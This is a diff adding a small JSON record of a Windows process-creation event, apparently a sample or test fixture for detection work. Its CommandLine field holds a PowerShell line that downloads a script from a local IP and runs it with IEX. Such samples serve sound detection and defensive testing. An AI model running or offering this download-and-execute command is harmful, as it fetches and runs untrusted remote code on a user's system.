@@ -1,0 +1,6 @@
+{
+  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "OriginalFileName": "PowerShell.EXE",
+  "CommandLine": "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.88.1/a.ps1')\"",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+}
